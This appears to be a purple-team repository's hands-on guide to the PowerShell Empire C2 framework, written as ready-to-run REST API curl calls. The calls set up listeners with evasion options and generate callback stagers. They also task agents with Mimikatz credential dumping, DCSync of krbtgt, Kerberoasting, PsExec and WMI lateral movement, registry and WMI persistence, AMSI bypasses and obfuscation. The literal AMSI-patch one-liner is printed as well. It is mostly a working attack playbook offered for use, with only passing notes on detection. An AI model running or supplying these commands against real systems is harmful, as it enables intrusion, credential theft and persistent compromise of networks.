# PowerShell Empire — Hands-On Use Cases

All commands verified against `BC-SECURITY/Empire` `v6.7.1` source (`empire/server/api/v2/*`, `empire/server/listeners/*.py`, `empire/server/stagers/*`) — there is no interactive console (see `01 - Overview.md`'s History), so every example below is a RESTful API call. Substitute `$SERVER` (e.g. `http://127.0.0.1:1337`) and `$TOKEN` throughout; obtain `$TOKEN` once per session:

```bash
TOKEN=$(curl -s -X POST "$SERVER/token" \
  -d "username=empireadmin&password=password123" | jq -r .access_token)
# Every subsequent call: -H "Authorization: Bearer $TOKEN"
```

Where a Starkiller-equivalent GUI action exists, it's noted inline — Starkiller calls this exact same API, so the JSON bodies below are also what Starkiller sends under the hood.

## Contents
- [Baseline HTTP Listener and PowerShell Stager](#baseline-http-listener-and-powershell-stager)
- [HTTPS Listener with JA3 Evasion for Internet-Facing Ops](#https-listener-with-ja3-evasion-for-internet-facing-ops)
- [Malleable HTTP Listener with a Custom Traffic Profile](#malleable-http-listener-with-a-custom-traffic-profile)
- [Python 3 Agent for a Linux/macOS Target](#python-3-agent-for-a-linuxmacos-target)
- [C# (Sharpire) Agent Stager](#c-sharpire-agent-stager)
- [IronPython Agent](#ironpython-agent)
- [Go (Gopire) Agent](#go-gopire-agent)
- [http_foreign — Cross-Server Stager Generation](#http_foreign--cross-server-stager-generation)
- [http_hop — PHP Redirector Pivot](#http_hop--php-redirector-pivot)
- [SMB Peer-to-Peer Pivot](#smb-peer-to-peer-pivot)
- [port_forward_pivot Through an Elevated Agent](#port_forward_pivot-through-an-elevated-agent)
- [Credential Harvesting with the Mimikatz Module Family](#credential-harvesting-with-the-mimikatz-module-family)
- [Kerberoasting via the Rubeus Module](#kerberoasting-via-the-rubeus-module)
- [Lateral Movement via Built-In Modules](#lateral-movement-via-built-in-modules)
- [Persistence Modules](#persistence-modules)
- [Situational Awareness with Seatbelt and SharpHound](#situational-awareness-with-seatbelt-and-sharphound)
- [Applying AMSI/ETW Bypasses at Generation Time](#applying-amsietw-bypasses-at-generation-time)
- [Applying Obfuscation Before Delivery](#applying-obfuscation-before-delivery)
- [Raw API Scripting vs. the Starkiller GUI](#raw-api-scripting-vs-the-starkiller-gui)
- [Multi-Operator Engagement via Independent API Users](#multi-operator-engagement-via-independent-api-users)
- [Installing and Running a Plugin Marketplace Plugin](#installing-and-running-a-plugin-marketplace-plugin)

---

## Baseline HTTP Listener and PowerShell Stager

**MITRE ATT&CK:** [T1071.001](https://attack.mitre.org/techniques/T1071/001/) (Web Protocols) · [T1573.001](https://attack.mitre.org/techniques/T1573/001/) / [T1573.002](https://attack.mitre.org/techniques/T1573/002/) (Symmetric/Asymmetric Cryptography) · [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer, for stager delivery)

```bash
# 1. Create the listener
curl -s -X POST "$SERVER/api/v2/listeners/" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "name": "http-baseline",
    "template": "http",
    "options": {
      "Name": "http-baseline",
      "Host": "http://203.0.113.10",
      "BindIP": "0.0.0.0",
      "Port": "80",
      "Launcher": "powershell -noP -sta -w 1 -enc ",
      "StagingKey": "REPLACE_ME_DO_NOT_USE_THE_DEFAULT",
      "DefaultDelay": 5,
      "DefaultJitter": 0.0,
      "DefaultLostLimit": 60,
      "DefaultProfile": "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
      "Headers": "Server:Microsoft-IIS/7.5",
      "Cookie": "session"
    }
  }'

# 2. Generate a stage-0 PowerShell launcher against it
curl -s -X POST "$SERVER/api/v2/stagers/" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "name": "ps-launcher",
    "template": "multi_launcher",
    "options": {
      "Listener": "http-baseline",
      "Language": "powershell",
      "Base64": "True",
      "SafeChecks": "True",
      "Obfuscate": "False"
    }
  }'
```

`StagingKey`, `DefaultProfile`, `Headers`, and `Cookie` are shown at their **source-verified defaults** deliberately — this is the config every unmodified engagement ships with, and exactly what `05 - Detection and Hunting.md` hunts for first. Replace `StagingKey` before any real use; leaving it at `2c103f2c4ed1e59c0b4e2e01821770fa` means every unmodified Empire deployment on the internet shares the same pre-shared key. The `multi_launcher` response is a base64-encoded PowerShell one-liner ready to deliver by any means (phishing macro, `wmic`, `PsExec`, etc.).

## HTTPS Listener with JA3 Evasion for Internet-Facing Ops

**MITRE ATT&CK:** [T1071.001](https://attack.mitre.org/techniques/T1071/001/) (Web Protocols) · [T1573.002](https://attack.mitre.org/techniques/T1573/002/) (Asymmetric Cryptography) · [T1090](https://attack.mitre.org/techniques/T1090/) (Proxy, conceptually — traffic blending)

```bash
curl -s -X POST "$SERVER/api/v2/listeners/" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "name": "https-external",
    "template": "http",
    "options": {
      "Name": "https-external",
      "Host": "https://c2.example.com",
      "BindIP": "0.0.0.0",
      "Port": "443",
      "CertPath": "/opt/empire/certs/c2",
      "JA3_Evasion": "True",
      "StagingKey": "REPLACE_ME",
      "DefaultProfile": "/api/v1/status,/health,/js/main.min.js|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
  }'
```

`CertPath` must point to a directory holding a valid cert/key pair for the listener to bind HTTPS at all; `JA3_Evasion` (default `False`) only has an effect once HTTPS is active — it randomizes the TLS cipher list per `listener_util.generate_random_cipher()` to defeat static JA3/JA3S fingerprinting of the underlying Python/Werkzeug TLS stack. Pairing this with a non-default `DefaultProfile` (shown here mimicking an API health-check pattern instead of the stock `/admin/get.php`) removes both of the two cheapest static signatures at once.

## Malleable HTTP Listener with a Custom Traffic Profile

**MITRE ATT&CK:** [T1071.001](https://attack.mitre.org/techniques/T1071/001/) (Web Protocols) · [T1001](https://attack.mitre.org/techniques/T1001/) (Data Obfuscation, via profile-driven transforms)

```bash
# 1. Load a Cobalt-Strike-format .profile (Global Options + HTTP/S blocks only)
curl -s -X POST "$SERVER/api/v2/malleable-profiles/" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "name": "my-profile",
    "content": "<contents of a .profile file>"
  }'

# 2. Start the http_malleable listener referencing it
curl -s -X POST "$SERVER/api/v2/listeners/" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "name": "malleable-c2",
    "template": "http_malleable",
    "options": {
      "Name": "malleable-c2",
      "Host": "https://c2.example.com",
      "Port": "443",
      "Profile": "my-profile",
      "StagingKey": "REPLACE_ME"
    }
  }'
```

Empire reuses the Cobalt Strike Malleable C2 profile format (ported from Johneiser's parser) so existing CS profiles are directly reusable — but Empire currently only ingests the profile's **Global Options** and **HTTP/S blocks**, not the fuller CS 4.0 transform/`http-config` surface. See [`BC-SECURITY/Malleable-C2-Profiles`](https://github.com/BC-SECURITY/Malleable-C2-Profiles) for ready-made, engagement-tested profiles rather than hand-rolling one. Only one profile can be active per Empire instance at a time — run a second server if a second concurrent Malleable listener is needed.

## Python 3 Agent for a Linux/macOS Target

**MITRE ATT&CK:** [T1059.006](https://attack.mitre.org/techniques/T1059/006/) (Python) · [T1071.001](https://attack.mitre.org/techniques/T1071/001/)

```bash
curl -s -X POST "$SERVER/api/v2/stagers/" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "name": "py-launcher",
    "template": "multi_launcher",
    "options": {
      "Listener": "http-baseline",
      "Language": "python",
      "Base64": "True",
      "SafeChecks": "True"
    }
  }'
```

The Python agent is Empire's cross-platform option for non-Windows targets — it runs the same tasking model (shell/module/upload/download) but without the PowerShell-specific modules that require the .NET-adjacent AMSI/CLR surface. For OS-specific delivery formats rather than a bare launcher one-liner, use `linux_bash`/`linux_pyinstaller` (Linux) or the `osx/*` stager family (macOS: `osx_macho`, `osx_application`, `osx_jar`, `osx_dylib`, etc.).

## C# (Sharpire) Agent Stager

**MITRE ATT&CK:** [T1059.003](https://attack.mitre.org/techniques/T1059/003/) (Windows Command Shell, host process) · [T1027](https://attack.mitre.org/techniques/T1027/) (Obfuscated Files or Information, via ConfuserEx)

```bash
curl -s -X POST "$SERVER/api/v2/stagers/" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "name": "csharp-exe",
    "template": "windows_csharp_exe",
    "options": {
      "Listener": "http-baseline"
    }
  }'
```

The C# agent (project name **Sharpire**) is compiled server-side via the bundled Empire-Compiler (Roslyn, derived from Covenant's compiler work) — the API call above returns a compiled `.exe` rather than a script one-liner. Because it's a compiled artifact, `multi_generate_agent` (stageless) doesn't apply to it the way it does to script-based agents; it's inherently "pre-staged" the moment it's compiled.

## IronPython Agent

**MITRE ATT&CK:** [T1059.006](https://attack.mitre.org/techniques/T1059/006/) (Python, via .NET) · [T1218](https://attack.mitre.org/techniques/T1218/) (System Binary Proxy Execution, if hosted via a signed .NET launcher)

```bash
curl -s -X POST "$SERVER/api/v2/stagers/" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "name": "ironpython-launcher",
    "template": "multi_launcher",
    "options": {
      "Listener": "http-baseline",
      "Language": "ironpython"
    }
  }'
```

IronPython runs Python code inside the .NET CLR, letting the agent call .NET libraries directly from Python and — per the project's own docs — **run PowerShell, C#, and Python taskings from a single agent**. It is also, as of this build, **the only agent language compatible with the `smb` listener** (see below), making it the default choice whenever SMB pivoting is part of the plan.

## Go (Gopire) Agent

**MITRE ATT&CK:** [T1071.001](https://attack.mitre.org/techniques/T1071/001/) · [T1027](https://attack.mitre.org/techniques/T1027/) (compiled, no interpreter footprint)

```bash
curl -s -X POST "$SERVER/api/v2/stagers/" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "name": "go-launcher",
    "template": "multi_go_exe",
    "options": {
      "Listener": "http-baseline"
    }
  }'
```

The Go agent (**Gopire**) is reflectively loaded and, per the project's own docs, is currently **Windows-only and HTTP-listener-only** — it does not yet support the `smb`, `http_malleable`, or other listener types. Use it where a small, dependency-free, natively-compiled footprint matters more than feature breadth; it still runs PowerShell/C#/shell taskings dispatched from the server.

## http_foreign — Cross-Server Stager Generation

**MITRE ATT&CK:** [T1071.001](https://attack.mitre.org/techniques/T1071/001/) · [T1105](https://attack.mitre.org/techniques/T1105/)

```bash
# On Server B, register Server A's already-running listener as "foreign"
curl -s -X POST "$SERVER_B/api/v2/listeners/" -H "Authorization: Bearer $TOKEN_B" \
  -H "Content-Type: application/json" -d '{
    "name": "foreign-to-a",
    "template": "http_foreign",
    "options": {
      "Name": "foreign-to-a",
      "Host": "http://serverA.example.com",
      "Port": "80",
      "StagingKey": "<Server A listeners StagingKey>",
      "Launcher": "powershell -noP -sta -w 1 -enc "
    }
  }'

# Generate a stager against the foreign listener from Server B
curl -s -X POST "$SERVER_B/api/v2/stagers/" -H "Authorization: Bearer $TOKEN_B" \
  -H "Content-Type: application/json" -d '{
    "name": "foreign-stager",
    "template": "multi_launcher",
    "options": {"Listener": "foreign-to-a", "Language": "powershell"}
  }'
```

`http_foreign` doesn't run its own listener socket — it's a stager-generation shim that must be handed the target listener's real `StagingKey`/`Host`/`Launcher` values so the generated stager talks correctly to the *other* server. Useful for splitting "stager-generation infrastructure" from "C2-receiving infrastructure" across separate hosts/teams.

## http_hop — PHP Redirector Pivot

**MITRE ATT&CK:** [T1090.002](https://attack.mitre.org/techniques/T1090/002/) (External Proxy) · [T1071.001](https://attack.mitre.org/techniques/T1071/001/)

```bash
curl -s -X POST "$SERVER/api/v2/listeners/" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "name": "hop-front",
    "template": "http_hop",
    "options": {
      "Name": "hop-front",
      "RedirectListener": "http-baseline",
      "Host": "http://redirector.example.com"
    }
  }'
```

Creating the `http_hop` listener generates `hop.php` (source: `empire/server/data/misc/hop.php`) — upload that file to a PHP-capable intermediary web server, then point stagers at the redirector's `Host` instead of the real listener directly. `RedirectStagingKey`/`DefaultProfile` are auto-extracted from the referenced `RedirectListener`, so the redirector transparently forwards the exact same staging traffic to the real listener behind it.

## SMB Peer-to-Peer Pivot

**MITRE ATT&CK:** [T1090.001](https://attack.mitre.org/techniques/T1090/001/) (Internal Proxy) · [T1021.002](https://attack.mitre.org/techniques/T1021/002/) (SMB/Windows Admin Shares, for the underlying transport)

```bash
curl -s -X POST "$SERVER/api/v2/listeners/" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "name": "smb-pivot",
    "template": "smb",
    "options": {
      "Name": "smb-pivot",
      "Agent": "AB12CD34",
      "PipeName": "custom_pipe_name"
    }
  }'
```

`Agent` must be an **already-checked-in agent** — the SMB listener runs *on* that agent's host, not standalone. Generate an **IronPython** stager (the only currently supported agent language for this listener) referencing `smb-pivot`, and deliver it to a second, network-adjacent host that has SMB/IPC reachability to the pivot host but no direct egress of its own. `PipeName` defaults to `empire_pipe` if left unset — always override it for anything beyond a lab test.

## port_forward_pivot Through an Elevated Agent

**MITRE ATT&CK:** [T1090.001](https://attack.mitre.org/techniques/T1090/001/) (Internal Proxy) · [T1572](https://attack.mitre.org/techniques/T1572/) (Protocol Tunneling)

```bash
curl -s -X POST "$SERVER/api/v2/listeners/" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "name": "portfwd-pivot",
    "template": "port_forward_pivot",
    "options": {
      "Name": "portfwd-pivot",
      "Agent": "AB12CD34",
      "ListenPort": 8443
    }
  }'
```

Listener options are **copied from the referenced agent's own listener config**, and the agent must be running in an **elevated context** — this listener rides the existing agent's own port-forwarding capability rather than opening a fresh independent socket, so a second implant generated against it reaches the C2 server entirely through the first agent's existing channel.

## Credential Harvesting with the Mimikatz Module Family

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/) (LSASS Memory) · [T1003.006](https://attack.mitre.org/techniques/T1003/006/) (DCSync) · [T1558.001](https://attack.mitre.org/techniques/T1558/001/) (Golden Ticket)

```bash
# LSASS credential dump (sekurlsa::logonpasswords)
curl -s -X POST "$SERVER/api/v2/agents/AB12CD34/tasks/module" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "module_id": "powershell_credentials_mimikatz_logonpasswords",
    "options": {}
  }'

# DCSync a specific account
curl -s -X POST "$SERVER/api/v2/agents/AB12CD34/tasks/module" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "module_id": "powershell_credentials_mimikatz_dcsync",
    "options": {"User": "CORP\\krbtgt"}
  }'
```

Module IDs are the module's on-disk path, slugified (slash → underscore, lowercased) — `empire/server/modules/powershell/credentials/mimikatz/logonpasswords.yaml` becomes `powershell_credentials_mimikatz_logonpasswords`. The `mimikatz` module family wraps `Invoke-Mimikatz.ps1` (credited to Joseph Bialek and Benjamin Delpy/`gentilkiwi`, same underlying Mimikatz project as `Purple Teaming/Mimikatz/`) — see that folder for the raw `sekurlsa`/`lsadump`/`kerberos` mechanics this module invokes; this note only covers the Empire tasking wrapper.

## Kerberoasting via the Rubeus Module

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/) (Kerberoasting)

```bash
curl -s -X POST "$SERVER/api/v2/agents/AB12CD34/tasks/module" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "module_id": "csharp_credentials_rubeus",
    "options": {"Command": "kerberoast"}
  }'
```

Empire ships **Rubeus** as a compiled C# module (`empire/server/modules/csharp/credentials/Rubeus.yaml`) executed via the Empire-Compiler/Roslyn pipeline in-memory on the agent — no separate `execute-assembly`-style loader step needed the way some other C2s require. Once Rubeus itself is documented as its own tool folder in this repo, cross-link here for the ticket-forging/roasting mechanics; for now, the underlying Kerberos mechanics mirror what `Purple Teaming/Mimikatz/kerberos (Golden-Silver Ticket)/` documents for ticket abuse generally.

## Lateral Movement via Built-In Modules

**MITRE ATT&CK:** [T1569.002](https://attack.mitre.org/techniques/T1569/002/) (Service Execution) · [T1047](https://attack.mitre.org/techniques/T1047/) (WMI) · [T1021.003](https://attack.mitre.org/techniques/T1021/003/) (Distributed Component Object Model) · [T1021.006](https://attack.mitre.org/techniques/T1021/006/) (Windows Remote Management)

```bash
# PsExec-style service execution
curl -s -X POST "$SERVER/api/v2/agents/AB12CD34/tasks/module" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "module_id": "powershell_lateral_movement_invoke_psexec",
    "options": {"ComputerName": "WKSTN02", "Listener": "http-baseline"}
  }'

# WMI-based execution
curl -s -X POST "$SERVER/api/v2/agents/AB12CD34/tasks/module" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "module_id": "powershell_lateral_movement_invoke_wmi",
    "options": {"ComputerName": "WKSTN02", "Listener": "http-baseline"}
  }'
```

Every lateral-movement module in `powershell/lateral_movement/` (`invoke_psexec`, `invoke_wmi`, `invoke_dcom`, `invoke_psremoting`, `invoke_smbexec`, `new_gpo_immediate_task`, `invoke_sshcommand`, `Invoke-RDPHijack`) takes a `Listener` option — the module's job is to plant and trigger a **new stager** against the specified listener on the remote host, so a successful run shows up as a brand-new agent checking in from `WKSTN02`, not as remote-code-execution output returned inline.

## Persistence Modules

**MITRE ATT&CK:** [T1547.001](https://attack.mitre.org/techniques/T1547/001/) (Registry Run Keys) · [T1053.005](https://attack.mitre.org/techniques/T1053/005/) (Scheduled Task) · [T1546.003](https://attack.mitre.org/techniques/T1546/003/) (WMI Event Subscription) · [T1558.001](https://attack.mitre.org/techniques/T1558/001/) (Golden Ticket, as a persistence mechanism)

```bash
# Registry Run-key persistence (userland, no elevation required)
curl -s -X POST "$SERVER/api/v2/agents/AB12CD34/tasks/module" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "module_id": "powershell_persistence_userland_registry",
    "options": {"Listener": "http-baseline"}
  }'

# WMI event subscription persistence (elevated)
curl -s -X POST "$SERVER/api/v2/agents/AB12CD34/tasks/module" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "module_id": "powershell_persistence_elevated_wmi",
    "options": {"Listener": "http-baseline"}
  }'
```

Persistence modules are split into `userland/` (no admin required — registry, scheduled task, LNK-based) and `elevated/` (admin/system — WMI subscriptions, Skeleton Key, SSP registration, RID hijacking) trees, plus a `misc/` set for less common techniques (`add_sid_history`, `disable_machine_acct_change`, `debugger`/IFEO). Every one of them, like the lateral-movement modules, generates and plants a fresh stager rather than "resuming" the existing agent.

## Situational Awareness with Seatbelt and SharpHound

**MITRE ATT&CK:** [T1082](https://attack.mitre.org/techniques/T1082/) (System Information Discovery) · [T1069](https://attack.mitre.org/techniques/T1069/) (Permission Groups Discovery) · [T1087](https://attack.mitre.org/techniques/T1087/) (Account Discovery)

```bash
# Seatbelt (C#)
curl -s -X POST "$SERVER/api/v2/agents/AB12CD34/tasks/module" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "module_id": "csharp_situational_awareness_seatbelt",
    "options": {"Command": "-group=system"}
  }'

# SharpHound/BloodHound ingestor
curl -s -X POST "$SERVER/api/v2/agents/AB12CD34/tasks/module" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "module_id": "powershell_situational_awareness_network_bloodhound",
    "options": {"CollectionMethod": "Default"}
  }'
```

Both are the exact upstream tools wrapped as modules — see `Purple Teaming/Seatbelt/` and `Purple Teaming/BloodHound/SharpHound/` for the full command surface and target-side evidence those tools leave; this note only adds the Empire tasking layer on top. The BloodHound module is tagged **Legacy** collection format in Empire's own module metadata (verified against `01 - Overview.md`'s changelog note on the 6.0 release) — confirm compatibility against whichever BloodHound version (Legacy vs. CE) the engagement's ingest pipeline expects.

## Applying AMSI/ETW Bypasses at Generation Time

**MITRE ATT&CK:** [T1562.001](https://attack.mitre.org/techniques/T1562/001/) (Disable or Modify Tools — AMSI/ETW)

```bash
curl -s -X POST "$SERVER/api/v2/stagers/" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "name": "ps-launcher-bypassed",
    "template": "multi_launcher",
    "options": {
      "Listener": "http-baseline",
      "Language": "powershell",
      "Bypasses": "mattifestation etw"
    }
  }'
```

`Bypasses` accepts a space-separated list of bypass names, each a small pre-written PowerShell snippet prepended before the stager/module runs. `mattifestation` is the well-known `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($Null,$true)` patch — heavily signatured by every modern AV/EDR product precisely because it's public and unchanged since ~2018; treat it as a lab/lightly-defended-target technique, not a reliable production bypass. `rastamouse` and `liberman` are alternate AMSI-bypass implementations shipped for the same reason `msfvenom` ships multiple encoders — signature diversity, not stronger evasion.

## Applying Obfuscation Before Delivery

**MITRE ATT&CK:** [T1027](https://attack.mitre.org/techniques/T1027/) (Obfuscated Files or Information) · [T1140](https://attack.mitre.org/techniques/T1140/) (Deobfuscate/Decode Files or Information, inverse)

```bash
curl -s -X POST "$SERVER/api/v2/stagers/" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "name": "ps-launcher-obfuscated",
    "template": "multi_launcher",
    "options": {
      "Listener": "http-baseline",
      "Language": "powershell",
      "Obfuscate": "True",
      "ObfuscateCommand": "Token\\All\\1"
    }
  }'

# Pre-obfuscate a specific module ahead of tasking, instead of paying the cost at task time
curl -s -X POST "$SERVER/api/v2/obfuscation/modules/preobfuscate" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{"module_id": "powershell_credentials_mimikatz_logonpasswords"}'
```

`ObfuscateCommand` values are literal Invoke-Obfuscation command strings (`Token\All\1` applies all token-layer obfuscations at intensity 1). Obfuscation runs as a subprocess with a configurable timeout (`obfuscation.timeout` in `config.yaml`, default 300s) — large modules (Mimikatz, PowerView) are the ones most likely to need that budget raised.

## Raw API Scripting vs. the Starkiller GUI

**MITRE ATT&CK:** N/A — operator tooling choice, not a target-facing technique

Every example in this file is a raw `curl` call against `/api/v2/`. **Starkiller** — the bundled web GUI, served from the same running server at `/` — issues the identical calls from a browser session; nothing is GUI-exclusive or API-exclusive. The practical split: scripted/automated engagements (CI-driven adversary emulation, bulk agent tasking, integration with external tooling) favor raw API calls or a small Python wrapper script; live interactive operation, file-browsing, and multi-operator visibility favor Starkiller. Because there's no third "console" option anymore (see `01 - Overview.md`), picking between these two is the *only* interaction-model decision an operator makes.

## Multi-Operator Engagement via Independent API Users

**MITRE ATT&CK:** N/A — infrastructure/access-control setup

```bash
curl -s -X POST "$SERVER/api/v2/users/" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{
    "username": "operator2",
    "password": "a-real-password-not-password123",
    "enabled": true,
    "admin": false
  }'
```

Each provisioned user authenticates independently via `/token` and gets their own JWT — there's no shared console session or "who else is connected" state to manage the way Sliver's mTLS operator certs or a classic C2 console's multiplayer mode work. All users share the same underlying agent/listener/module state (it's one database), but every action is individually attributable to the JWT that made the call — check server-side request logs for `Authorization` header/user-ID correlation when reconstructing who did what during an engagement.

## Installing and Running a Plugin Marketplace Plugin

**MITRE ATT&CK:** [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer, for the plugin download itself) — the plugin's own actions carry whatever techniques it implements

```bash
# List available plugins from a configured registry, then execute one
curl -s "$SERVER/api/v2/plugins/" -H "Authorization: Bearer $TOKEN"

curl -s -X POST "$SERVER/api/v2/plugins/socks_proxy_server/execute" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"agent": "AB12CD34", "port": 1080}'
```

Plugins are server-side automation extensions distributed via the **Plugin Marketplace** (introduced 6.0) from a configured git-backed registry (BC-Security's own [`Empire-Plugin-Registry`](https://github.com/BC-SECURITY/Empire-Plugin-Registry) by default). Real examples in the wild: a SOCKS proxy server plugin, a report-generation plugin, and community automation like **DeathStar** (chains recon → Kerberoasting/credential modules → lateral movement automatically to gain Domain/Enterprise Admin). Plugins can be pre-installed unattended via `auto_install` in `config.yaml` — useful for reproducible Docker-based lab/CI builds.
